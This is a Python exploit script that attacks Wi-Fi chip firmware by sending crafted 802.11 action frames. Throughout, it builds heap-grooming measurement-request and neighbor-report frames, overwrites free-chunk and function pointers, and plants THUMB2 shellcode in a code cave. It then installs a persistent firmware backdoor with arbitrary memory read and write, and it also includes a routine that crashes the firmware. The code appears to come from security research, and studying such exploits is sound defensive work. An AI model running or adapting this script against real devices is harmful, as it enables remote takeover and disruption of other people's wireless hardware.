import sys, os, time, struct
from conf import *
from symbols import *
from commands import *

#The width, in bytes, of a THUMB2 instruction
THUMB2_INST_WIDTH = 4

def create_basic_measurement_req_ie(token, channel, start_time, duration):
    '''
    Creates a measurement request IE with the "basic" measurement type, triggering an allocation of 17 bytes
    The controlled bytes in the allocation are at indices: 2, [5,16)
    '''
    fields = (38,      #IE Tag
              14,      #IE Length
              token,   #Token
              0,       #Mode
              0,       #Type = BASIC
              channel) #Channel
    return struct.pack("<BBBBBB", *fields) + start_time + struct.pack("<H", duration)

def create_cca_measurement_req_ie(token):
    '''
    Creates a measurement request IE with the "CCA" measurement type, triggering an allocation of 5 bytes
    The controlled bytes in the allocation are at indices: 2, 4
    '''
    fields = (38,      #IE Tag
              14,      #IE Length
              token,   #Token
              0,       #Mode
              1,       #Type = CCA
              0)       #Channel
    time_and_duration = "\x10" * 10
    return struct.pack("<BBBBBB", *fields) + time_and_duration

def create_sta_statistics_measurement_req(measurement_token, val):
    '''
    Creates an STA Statistics measurement request IE (7.3.2.21.8), triggering an allocation of 20 bytes
    The controlled bytes in the allocation are at indices [16-20)
    '''
    low, hi = struct.unpack("<HH", struct.pack("<I", val))
    val = struct.unpack("<I", struct.pack("<HH", hi, low))[0]
    fields = (38,                #IE Tag
              14,                #IE Length
              measurement_token, #Measurement Token
              0,                 #Measurement Mode
              7,                 #Measurement Type = STA Statistics
              6*"\xAA",          #Peer MAC Address
              val,               #Randomisation Interval + Measurement Duration
              0)                 #Group Identity
    return struct.pack("<BBBBB6sIB", *fields)

def create_chunk_overwrite_req(chunk_addr, chunk_size):
    '''
    Crafts a series of Spectrum Management IEs that trigger an overwrite of the crafted overlapping freechunk,
    thereby replacing the chunk's size with "chunk_size", and its "next" pointer with "chunk_addr".
    '''

    #Initial padding
    req_buffer = create_cca_measurement_req_ie(0xAA)
    req_buffer += ''.join([create_basic_measurement_req_ie(0xAA, 0xAA, ("AA" * 8).decode("hex"), 0xAAAA) for i in range(0, 9)])
    
    #Adding the actual IE which will be used to overwrite BA5's freechunk
    req_buffer += create_basic_measurement_req_ie(0xAA, 0xAA, struct.pack("<II", chunk_size, chunk_addr), 0xAAAA)

    #Adding another padding IEs to make the length divisible by 4
    req_buffer += create_cca_measurement_req_ie(0xAA)
   
    return req_buffer

def create_code_cave_chunk():
    '''
    Creates a series of measurement request IEs which, when allocated, will introduce a backdoor
    into the RRM neighbor report handler, allowing easy write access to the firmware.
    '''
    chunk = ''
                                                                                                          #b0:
    chunk += create_sta_statistics_measurement_req(0, struct.unpack("<I", struct.pack("<HH", 0x481D,      #  LDR R0, dstaddr
                                                                                             0xE007))[0]) #  B b1
                                                                                                          #b1:
    chunk += create_sta_statistics_measurement_req(1, struct.unpack("<I", struct.pack("<HH", 0x491D,      #  LDR R1, val1
                                                                                             0xE007))[0]) #  B b2
                                                                                                          #b2:
    chunk += create_sta_statistics_measurement_req(2, struct.unpack("<I", struct.pack("<HH", 0x6001,      #  STR R1, [R0]
                                                                                             0xE007))[0]) #  B b3
                                                                                                          #b3:
    chunk += create_sta_statistics_measurement_req(3, struct.unpack("<I", struct.pack("<HH", 0x4918,      #  LDR R1, val2
                                                                                             0xE007))[0]) #  B b4
                                                                                                          #b4:
    chunk += create_sta_statistics_measurement_req(4, struct.unpack("<I", struct.pack("<HH", 0x6041,      #  STR R1, [R0, #4]
                                                                                             0xE007))[0]) #  B b5
                                                                                                          #b5:
    chunk += create_sta_statistics_measurement_req(5, struct.unpack("<I", struct.pack("<HH", 0x2000,      #  MOV R0, #0
                                                                                             0x4770))[0]) #  BX LR
                                                                                                          #dstaddr: 
    chunk += create_sta_statistics_measurement_req(6, WLC_RRM_RECV_NEIGHBOR_REPORT_RESPONSE_INTERNAL)     #  .word 0xVALUE
                                                                                                          #val1: 
    chunk += create_sta_statistics_measurement_req(7, struct.unpack("<I", struct.pack("<HH", 0x6890,      #  LDR R0, [R2, #8]
                                                                                             0x68D1))[0]) #  LDR R1, [R2, #12]
                                                                                                          #val2: 
    chunk += create_sta_statistics_measurement_req(8, struct.unpack("<I", struct.pack("<HH", 0x6001,      #  STR R1, [R0]
                                                                                             0x4770))[0]) #  BX LR
    for i in range(9, 23):
        chunk += create_sta_statistics_measurement_req(i, 0xCCCCCCCC)
    return chunk

def write_dword(addr, val):
    '''
    Writes the given value to the given address using the backdoor inserted into the NRREP handler
    '''
    fields = (0,     #Padding
              0,     #Command = WRITE
              addr,  #Address
              val)   #Value
    nrrep_raw(struct.pack("<BIII", *fields))

def read_dword(addr):
    '''
    Reads the DWORD at the given address using the secondary backdoor inserted into the NRREP handler
    '''

    #Clearing the state
    clear_backdoor_state()
    
    #Sending the trigger
    fields = (0,     #Padding
              1,     #Command = READ
              addr,  #Address
              0xAB,  #Token
              AP_MAC.replace(":","").decode("hex"))
    nrrep_raw(struct.pack("<BIII6s", *fields))

    #Polling until we get a response (or time out)
    start_time = time.time()
    while time.time() - start_time < MAX_READ_DWORD_POLL_TIME:
        time.sleep(POLL_GRANULARITY)
        state = get_backdoor_state()
        if state == None:
            continue
        callback_received, callback_result = state
        if callback_received != 1:
            continue
        return callback_result
    raise Exception("Timed out while waiting for backdoor callback result")

def crash_firmware():
    '''
    Crashes the firwmare by triggering a free on a extraodinarily large chunk
    '''
    for i in range(1, 8):
        addba(i)
    for i in range(225, 240):
        nrrep(i,i)
    for i in range(1, 8):
        delba(i)

def encode_thumb2_wide_branch(from_addr, to_addr):
    '''
    Encodes an unconditional THUMB2 wide branch from the given address to the given address.
    '''
    if from_addr < to_addr:
        s_bit = 0
        offset = to_addr - from_addr - THUMB2_INST_WIDTH
    else:
        s_bit = 1
        offset = 2**25 - (from_addr + THUMB2_INST_WIDTH - to_addr)

    i1 = (offset >> 24) & 1
    i2 = (offset >> 23) & 1
    j1 = (0 if i1 else 1) ^ s_bit
    j2 = (0 if i2 else 1) ^ s_bit

    b2 = 0b11110000 | (s_bit << 2) | ((offset >> 20) & 0b11)
    b1 = (offset >> 12) & 0xFF
    b4 = 0b10010000 | (j1 << 5) | (j2 << 3) | ((offset >> 9) & 0b111)
    b3 = (offset >> 1) & 0xFF
    return chr(b1) + chr(b2) + chr(b3) + chr(b4)
 
def is_backdoor_installed():
    '''
    Issues a READ command to the backdoor, return True iff the backdoor is installed
    '''
    try:
        read_dword(0x160000)
        return True
    except:
        return False

def run_exploit():
    '''
    Runs the exploit against the target MAC, attempting to install a rudimentary backdoor
    into the Wi-Fi firmware which allows us easy arbitrary read/write access to the firmware.
    '''
   
    print "[*] Rebooting the firmware"
    crash_firmware()
    time.sleep(FIRMWARE_REBOOT_DELAY) #Giving the firmware time to reboot

    print "[*] Removing existing BAs"
    for i in range(1, 8):
        delba(i)

    print "[*] Adding all BAs"
    for i in range(1, 8):
        addba(i)
    
    print "[*] Using NRREP to increment BA7 size by 140"
    for i in range(0,140):
        if (i+1) % ACTION_FRAME_COOLDOWN_WINDOW == 0:
            time.sleep(1)
        nrrep(225, 225)
    
    print "[*] Freeing BA7"
    delba(7)

    print "[*] Creating new (overlapping) BA7"
    addba(7)
 
    print "[*] Using NRREP to increment BA6 size to 150"
    for i in range(0, 150):
        if (i+1) % ACTION_FRAME_COOLDOWN_WINDOW == 0:
            time.sleep(1)
        nrrep(239, 239)
 
    print "[*] Freeing BA6"
    delba(6)

    print "[+] Feeing BA5"
    delba(5)
    
    print "[*] Incrementing BA6's freechunk size until it overlaps with BA5's chunk (BA6 size is set to 0xB0)"
    for i in range(0, 32):
        if (i+1) % ACTION_FRAME_COOLDOWN_WINDOW == 0:
            time.sleep(1)
        nrrep(239, 239)
    
    print "[*] Using SPECMEAS to point BA5's freechunk at a code cave location"
    specmeas([create_chunk_overwrite_req(CODE_CAVE_CHUNK, 0xFFFF0000)])

    print "[*] Using RMREQ to allocate code in the cave"
    rmreq(create_code_cave_chunk())

    print "[*] Using SPECMEAS to point before the disallowed range head"
    specmeas([create_chunk_overwrite_req(FAKE_CHUNK_DISALLOWED_RANGE_OVERWRITE, 0xFFFF0000)])

    print "[*] Using SPECMEAS to reduce the disallowed range"
    specmeas([create_cca_measurement_req_ie(0x00)])

    print "[*] Pointing at a location before the wl hc function pointer"
    specmeas([create_chunk_overwrite_req(FAKE_CHUNK_WL_HC, 0xFFFF0000)])

    print "[*] Using SPECMEAS to overwrite the function pointer"
    chunk = create_basic_measurement_req_ie(0x00, 0x00, struct.pack("<II", 0x0, 0x0), 0x0)
    chunk += create_cca_measurement_req_ie(0x00)
    chunk += create_basic_measurement_req_ie(0x00, 0x00, struct.pack("<II", CODE_CAVE_CHUNK + CODE_CAVE_CODE_OFFSET + 1, 0x0), 0x0)
    chunk += create_basic_measurement_req_ie(0x00, 0x00, struct.pack("<II", 0x0, 0x0), 0x0)
    chunk += create_basic_measurement_req_ie(0x00, 0x00, struct.pack("<II", 0x0, 0x0), 0x0)
    chunk += create_cca_measurement_req_ie(0x00)
    chunk += create_cca_measurement_req_ie(0x00)
    chunk += create_basic_measurement_req_ie(0x00, 0x00, struct.pack("<II", 0x0, 0x0), 0x0)
    specmeas([chunk])

    print "[*] Pointing away to a different location"
    specmeas([create_chunk_overwrite_req(BENIGN_CHUNK, 0xFFFF0000)])
  
    time.sleep(3) #Giving the period callback a chance to trigger

    print "[*] Removing the old backdoor callback"
    write_dword(WL_HC_PTR, WL_HC_ORIG_FUNC)

    print "[*] Fixing up the heap"
    write_dword(MAIN_FREECHUNK + struct.calcsize("I"), 0x0)
    write_dword(FREELIST_HEAD_PTR + struct.calcsize("I"), MAIN_FREECHUNK)

    print "[*] Writing backdoor"
    backdoor_addr = MAIN_FREECHUNK + 128
    backdoor = open("backdoor.bin", "rb").read()
    for i in range(0, len(backdoor), struct.calcsize("I")):
        write_dword(backdoor_addr + i, struct.unpack("<I", backdoor[i:i+struct.calcsize("I")])[0])
  
    print "[*] Redirecting NRREP handler to backdoor address"
    hook_insertion_addr = WLC_RRM_RECV_NEIGHBOR_REPORT_RESPONSE_INTERNAL
    branch = encode_thumb2_wide_branch(hook_insertion_addr, backdoor_addr)
    write_dword(hook_insertion_addr, struct.unpack("<I", branch)[0])

def main():

    for i in range(0, MAX_ATTEMPTS):
        if is_backdoor_installed():
            break
        print "[*] Backdoor not installed, attempting to exploit..."
        run_exploit()

    if not is_backdoor_installed():
        print "[-] Failed to install backdoor"
    else:
        print "[+] Backdoor successfully installed"


if __name__ == "__main__":
    main()
